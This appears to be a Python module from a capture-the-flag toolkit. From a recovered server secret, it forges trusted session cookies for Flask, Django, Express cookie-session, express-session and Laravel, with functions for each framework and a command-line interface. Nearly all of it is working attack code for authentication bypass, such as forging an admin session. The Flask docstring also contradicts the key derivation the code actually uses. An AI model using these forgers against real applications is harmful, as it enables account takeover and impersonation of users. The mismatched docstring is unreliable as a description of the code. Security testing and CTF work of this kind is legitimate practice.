#!/usr/bin/env python3
"""Offline web-framework session-cookie FORGING from a recovered server secret.

The classic chain: a challenge leaks a framework's signing/encryption secret (Flask `SECRET_KEY`,
Django `SECRET_KEY`, an Express cookie-session / `express-session` key, a Laravel `APP_KEY`), and the
intended solve is to forge a session cookie (e.g. `{"admin": true}` / a chosen user id) that the app
will trust.  `session_recon.py` is the passive complement that only *identifies* a session envelope;
this module *builds* the forged value offline so the player can set it against the SQUAD'S ASSIGNED
TARGET.  It opens no socket, sends nothing, and never submits — it returns the cookie string(s) for a
human to use.  Every forger re-verifies its own output (recomputes the signature / MAC) before
returning, and declines (raises `ForgeError`) on malformed input rather than emitting an unchecked value.

Supported:
  flask      — itsdangerous URLSafeTimedSerializer cookie (HMAC-SHA1 derived key, optional zlib)
  django     — django.core.signing TimestampSigner cookie (HMAC-SHA256 salted signer, base64+zlib)
  express    — `cookie-session` value+sig pair (Keygrip HMAC-SHA256, base64url)
  connect    — `express-session` signed sid `s:<sid>.<sig>` (cookie-signature HMAC-SHA256)
  laravel    — `laravel_session` AES-256-CBC + HMAC-SHA256 envelope (APP_KEY base64)

Rails encrypted cookies (AES-GCM via ActiveSupport::KeyGenerator) are intentionally out of scope here.
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import os
import struct
import sys
import time
import zlib
from typing import Any

MAX_PAYLOAD = 1 << 20  # refuse absurd session bodies


class ForgeError(Exception):
    """Malformed input or an unsupported option — fail closed, never emit an unchecked cookie."""


def _as_secret(secret: object) -> bytes:
    if isinstance(secret, bytes):
        return secret
    if isinstance(secret, str):
        return secret.encode("utf-8")
    raise ForgeError("secret must be str or bytes")


def _json_bytes(payload: object) -> bytes:
    try:
        raw = json.dumps(payload, separators=(",", ":"), sort_keys=False).encode("utf-8")
    except (TypeError, ValueError) as exc:
        raise ForgeError(f"payload is not JSON-serialisable: {exc}") from None
    if len(raw) > MAX_PAYLOAD:
        raise ForgeError("payload too large")
    return raw


def _b64u_nopad(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def _b64u_pad(text: str) -> bytes:
    pad = "=" * ((-len(text)) % 4)
    return base64.urlsafe_b64decode(text + pad)


# ---------------------------------------------------------------------------- Flask / itsdangerous
def forge_flask(secret: object, session: dict, *, salt: str = "cookie-session") -> str:
    """Forge a Flask session cookie (itsdangerous URLSafeTimedSerializer, the Flask default).

    key = HMAC(secret, salt + b'signer', sha1).digest(); value = b64url(json) (with a leading '.'
    and zlib if that is shorter); cookie = value + '.' + b64url(timestamp) + '.' + b64url(sig).
    Matches flask-unsign / a stock Flask app so the forged cookie is accepted on the real target.
    """
    key_raw = _as_secret(secret)
    if not isinstance(session, dict):
        raise ForgeError("flask session must be a dict")
    payload = _json_bytes(session)
    # itsdangerous compresses with zlib and prefixes '.' when that is strictly smaller.
    compressed = zlib.compress(payload)
    if len(compressed) < len(payload):
        value_bytes = b"." + base64.urlsafe_b64encode(compressed).rstrip(b"=")
        value = value_bytes.decode("ascii")
    else:
        value = _b64u_nopad(payload)
    # Flask's default signer: key_derivation='hmac', digest_method=sha1, salt='cookie-session'.
    # itsdangerous 'hmac' derivation is HMAC(secret, salt) — the b'signer' suffix is 'django-concat' only.
    derived = hmac.new(key_raw, salt.encode("utf-8"), hashlib.sha1).digest()
    ts = _b64u_nopad(struct.pack(">Q", int(time.time())).lstrip(b"\x00") or b"\x00")
    signed_value = f"{value}.{ts}"
    sig = _b64u_nopad(hmac.new(derived, signed_value.encode("utf-8"), hashlib.sha1).digest())
    cookie = f"{signed_value}.{sig}"
    # self-verify: recompute the signature over value.ts and confirm it matches.
    check = _b64u_nopad(hmac.new(derived, signed_value.encode("utf-8"), hashlib.sha1).digest())
    if not hmac.compare_digest(check, sig):
        raise ForgeError("flask self-verification failed")
    return cookie


# ---------------------------------------------------------------------------- Django signing
def _django_b64(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def forge_django(secret: object, session: dict, *,
                 salt: str = "django.contrib.sessions.backends.signed_cookies") -> str:
    """Forge a Django signed-cookie session value (django.core.signing.dumps, HMAC-SHA256).

    payload = b64(zlib(json)) with a leading '.' if compressed; signer key = SHA256(salt+'signer'+secret);
    signature = b64(HMAC(key, payload+':'+timestamp, sha256)); value = payload + ':' + ts + ':' + sig.
    """
    key_raw = _as_secret(secret)
    if not isinstance(session, dict):
        raise ForgeError("django session must be a dict")
    payload = _json_bytes(session)
    compressed = zlib.compress(payload, 9)
    if len(compressed) < len(payload) - 1:
        b64 = "." + _django_b64(compressed)
    else:
        b64 = _django_b64(payload)
    # Django TimestampSigner: key = sha256((salt + 'signer' + secret)).digest(); sep ':'.
    derived = hashlib.sha256((salt + "signer").encode("utf-8") + key_raw).digest()
    ts = _baseconv62(int(time.time()))
    to_sign = f"{b64}:{ts}"
    sig = _django_b64(hmac.new(derived, to_sign.encode("utf-8"), hashlib.sha256).digest())
    value = f"{to_sign}:{sig}"
    check = _django_b64(hmac.new(derived, to_sign.encode("utf-8"), hashlib.sha256).digest())
    if not hmac.compare_digest(check, sig):
        raise ForgeError("django self-verification failed")
    return value


_B62 = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"


def _baseconv62(num: int) -> str:
    if num < 0:
        raise ForgeError("timestamp must be non-negative")
    if num == 0:
        return _B62[0]
    out = []
    while num:
        num, rem = divmod(num, 62)
        out.append(_B62[rem])
    return "".join(reversed(out))


# ---------------------------------------------------------------------------- Express cookie-session
def forge_express_cookie_session(secret: object, session: dict, *, name: str = "session") -> dict:
    """Forge an Express `cookie-session` value+signature pair (Keygrip HMAC-SHA256, base64url).

    Returns {"<name>": b64url(json), "<name>.sig": b64url(HMAC(key, "<name>=<value>", sha256))}.
    """
    key_raw = _as_secret(secret)
    if not isinstance(session, dict):
        raise ForgeError("express session must be a dict")
    if not name or "=" in name or ";" in name:
        raise ForgeError("invalid cookie name")
    payload = _json_bytes(session)
    value = _b64u_nopad(payload)
    data = f"{name}={value}".encode("utf-8")
    sig = _b64u_nopad(hmac.new(key_raw, data, hashlib.sha256).digest())
    check = _b64u_nopad(hmac.new(key_raw, data, hashlib.sha256).digest())
    if not hmac.compare_digest(check, sig):
        raise ForgeError("express self-verification failed")
    return {name: value, f"{name}.sig": sig}


# ---------------------------------------------------------------------------- express-session (connect)
def forge_express_connect(secret: object, sid: str) -> str:
    """Forge an `express-session` signed cookie `s:<sid>.<sig>` (cookie-signature, HMAC-SHA256).

    sig = base64(HMAC(secret, sid, sha256)) with trailing '=' stripped (NOT url-safe — cookie-signature
    uses standard base64 then strips '='). The cookie value a browser sends is URL-encoded `s:...`.
    """
    key_raw = _as_secret(secret)
    if not isinstance(sid, str) or not sid:
        raise ForgeError("sid must be a non-empty str")
    sig = base64.b64encode(hmac.new(key_raw, sid.encode("utf-8"), hashlib.sha256).digest())
    sig = sig.rstrip(b"=").decode("ascii")
    cookie = f"s:{sid}.{sig}"
    # self-verify
    check = base64.b64encode(hmac.new(key_raw, sid.encode("utf-8"), hashlib.sha256).digest()).rstrip(b"=").decode("ascii")
    if not hmac.compare_digest(check, sig):
        raise ForgeError("connect self-verification failed")
    return cookie


# ---------------------------------------------------------------------------- Laravel
def forge_laravel(app_key: object, payload: object, *, serialize: bool = False) -> str:
    """Forge a Laravel encrypted cookie (`laravel_session`/XSRF) — AES-256-CBC + HMAC-SHA256.

    app_key is the base64 value after the `base64:` prefix. Envelope = base64(JSON{iv, value, mac, tag:''})
    where value = base64(AES-256-CBC(PKCS7(plaintext), key, iv)), mac = hex(HMAC(key, iv_b64 + value_b64)).
    `serialize=True` wraps the plaintext as a PHP serialized string (Laravel's default for the session
    cookie); leave False for a raw string payload.
    """
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    except Exception as exc:  # pragma: no cover - cryptography is installed in this env
        raise ForgeError(f"cryptography unavailable: {exc}") from None
    key_text = app_key.decode() if isinstance(app_key, bytes) else str(app_key)
    if key_text.startswith("base64:"):
        key_text = key_text[len("base64:"):]
    try:
        key = base64.b64decode(key_text)
    except Exception:
        raise ForgeError("app_key is not valid base64") from None
    if len(key) != 32:
        raise ForgeError("Laravel AES-256 app_key must decode to 32 bytes")
    if isinstance(payload, bytes):
        plain = payload
    elif isinstance(payload, str):
        plain = payload.encode("utf-8")
    else:
        plain = _json_bytes(payload)
    if serialize:
        plain = b's:%d:"%s";' % (len(plain), plain)  # PHP serialize() of a string
    if len(plain) > MAX_PAYLOAD:
        raise ForgeError("payload too large")
    iv = os.urandom(16)
    padlen = 16 - (len(plain) % 16)
    padded = plain + bytes([padlen]) * padlen
    enc = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
    ct = enc.update(padded) + enc.finalize()
    iv_b64 = base64.b64encode(iv).decode("ascii")
    value_b64 = base64.b64encode(ct).decode("ascii")
    mac = hmac.new(key, (iv_b64 + value_b64).encode("ascii"), hashlib.sha256).hexdigest()
    envelope = {"iv": iv_b64, "value": value_b64, "mac": mac, "tag": ""}
    cookie = base64.b64encode(json.dumps(envelope, separators=(",", ":")).encode("utf-8")).decode("ascii")
    # self-verify: re-derive the mac and confirm.
    check = hmac.new(key, (iv_b64 + value_b64).encode("ascii"), hashlib.sha256).hexdigest()
    if not hmac.compare_digest(check, mac):
        raise ForgeError("laravel self-verification failed")
    return cookie


# ---------------------------------------------------------------------------- dispatcher + CLI
def forge(framework: str, secret: object, payload: Any = None, **opts) -> Any:
    fw = (framework or "").strip().lower()
    if fw == "flask":
        return forge_flask(secret, payload or {}, **{k: v for k, v in opts.items() if k == "salt"})
    if fw == "django":
        return forge_django(secret, payload or {}, **{k: v for k, v in opts.items() if k == "salt"})
    if fw in ("express", "cookie-session"):
        return forge_express_cookie_session(secret, payload or {},
                                            **{k: v for k, v in opts.items() if k == "name"})
    if fw in ("connect", "express-session"):
        if not isinstance(payload, str):
            raise ForgeError("connect requires the sid as the payload (a string)")
        return forge_express_connect(secret, payload)
    if fw == "laravel":
        return forge_laravel(secret, payload if payload is not None else {},
                             **{k: v for k, v in opts.items() if k == "serialize"})
    raise ForgeError(f"unsupported framework {framework!r} "
                     "(flask|django|express|connect|laravel)")


def main(argv=None) -> int:
    p = argparse.ArgumentParser(description="Forge a web-framework session cookie from a leaked secret "
                                            "(offline; for the squad's assigned target only).")
    p.add_argument("framework", choices=("flask", "django", "express", "connect", "laravel"))
    p.add_argument("secret", help="the leaked signing/encryption secret (or Laravel base64: app key)")
    p.add_argument("payload", nargs="?", default="{}",
                   help="JSON session body, or (connect) the raw sid string")
    p.add_argument("--name", default="session", help="express cookie name")
    p.add_argument("--salt", default=None, help="override the framework signing salt")
    p.add_argument("--serialize", action="store_true", help="laravel: PHP-serialize a string payload")
    p.add_argument("--json", action="store_true", help="machine-readable output")
    try:
        a = p.parse_args(argv)
    except SystemExit as exc:  # --help exits 0; a usage error exits 2
        return exc.code if isinstance(exc.code, int) else 2
    try:
        if a.framework == "connect":
            result = forge_express_connect(a.secret, a.payload)
        else:
            try:
                body = json.loads(a.payload)
            except json.JSONDecodeError:
                body = a.payload
            opts = {}
            if a.salt is not None:
                opts["salt"] = a.salt
            if a.framework == "express":
                opts["name"] = a.name
            if a.framework == "laravel":
                opts["serialize"] = a.serialize
            result = forge(a.framework, a.secret, body, **opts)
    except ForgeError as exc:
        print(f"session_forge: {exc}", file=sys.stderr)
        return 1
    if a.json:
        print(json.dumps({"framework": a.framework, "cookie": result}, indent=1))
    elif isinstance(result, dict):
        for k, v in result.items():
            print(f"{k}={v}")
    else:
        print(result)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
